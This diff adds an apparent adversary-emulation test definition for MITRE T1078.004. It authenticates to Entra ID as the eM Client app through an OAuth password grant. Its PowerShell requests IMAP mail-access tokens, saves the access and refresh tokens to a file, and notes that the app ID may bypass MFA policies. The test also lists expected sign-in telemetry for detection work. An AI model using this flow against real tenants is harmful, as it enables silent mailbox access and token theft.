@@ -1,0 +1,94 @@
+attack_technique: T1078.004
+display_name: "Post-Exploitation – eM Client OAuth Sign-In (Custom Primitive)"
+atomic_tests:
+  - name: "Authenticate as eM Client to access mailbox silently"
+    auto_generated_guid: d6e7f8a9-b0c1-2345-defa-345678901215
+    description: |
+      Emulates the eM Client email application's OAuth2 authentication flow,
+      which uses a hardcoded client ID and redirect URI that many Entra tenants
+      have not blocked. This is custom primitive #1 (allowed gap in
+      wrap-don't-write policy): no upstream tool implements the exact eM Client
+      OAuth handshake, so a minimal raw OAuth2 helper is used. The client ID
+      is the known eM Client App ID (b084e965-ad12-4b2e-a979-6c0f58b73b6c).
+    supported_platforms:
+      - windows
+      - linux
+      - macos
+    input_arguments:
+      tenant_id:
+        description: "Entra tenant ID of the lab tenant."
+        type: String
+        default: "00000000-0000-0000-0000-000000000000"
+      username:
+        description: "Lab account UPN to authenticate as eM Client."
+        type: String
+      password:
+        description: "Lab account password."
+        type: String
+      token_output_path:
+        description: "Path to write the resulting token cache file."
+        type: Path
+        default: "#{token_cache_path}"
+    executor:
+      name: powershell
+      command: |
+        # eM Client custom primitive: raw OAuth2 ROPC for the eM Client App ID.
+        # This client ID is known to be exempt from MFA in some tenant configs.
+        $emClientId    = 'b084e965-ad12-4b2e-a979-6c0f58b73b6c'
+        $tokenEndpoint = "https://login.microsoftonline.com/#{tenant_id}/oauth2/v2.0/token"
+
+        $body = @{
+            grant_type    = 'password'
+            client_id     = $emClientId
+            username      = '#{username}'
+            password      = '#{password}'
+            scope         = 'openid profile offline_access https://outlook.office.com/IMAP.AccessAsUser.All'
+        }
+
+        try {
+            $response = Invoke-RestMethod -Method Post -Uri $tokenEndpoint `
+                -ContentType 'application/x-www-form-urlencoded' `
+                -Body $body -ErrorAction Stop
+        } catch {
+            $detail = ($_ | ConvertFrom-Json -ErrorAction SilentlyContinue)
+            throw "eM Client auth failed: $($detail.error_description ?? $_.Exception.Message)"
+        }
+
+        $cacheData = @{
+            accessToken  = $response.access_token
+            refreshToken = $response.refresh_token
+            idToken      = $response.id_token
+            tokenType    = $response.token_type
+            expiresOn    = ((Get-Date).AddSeconds($response.expires_in).ToUniversalTime().ToString('o'))
+            _clientId    = $emClientId
+            tenantId     = '#{tenant_id}'
+            resource     = 'https://outlook.office.com'
+        }
+
+        $cacheData | ConvertTo-Json -Depth 4 |
+            Set-Content -LiteralPath '#{token_output_path}' -NoNewline
+        Write-Host "eM Client token cached at '#{token_output_path}'."
+    cleanup_command: |
+      if (Test-Path -LiteralPath '#{token_output_path}') {
+          Remove-Item -LiteralPath '#{token_output_path}' -Force
+      }
+    references:
+      - "https://o365blog.com/post/em-client/"
+      - "https://aadinternals.com/post/aitm/"
+    auth_profile: "em-client"
+    defense_evasion: "eM Client App ID may be exempt from MFA CA policies; IMAP scope enables silent mail access"
+    requires_token: false
+    expected_telemetry:
+      - source: entra_signin
+        match:
+          appId: "b084e965-ad12-4b2e-a979-6c0f58b73b6c"
+          clientAppUsed: "Other clients"
+        within_minutes: 15
+      - source: ual
+        match:
+          Operations: "UserLoggedIn"
+          ClientAppId: "b084e965-ad12-4b2e-a979-6c0f58b73b6c"
+        within_minutes: 20
+    exercises_chokepoint:
+      id: "DC-POSTEX-004"
+      url: "https://detectionchokepoints.com/postex/em-client-signin"
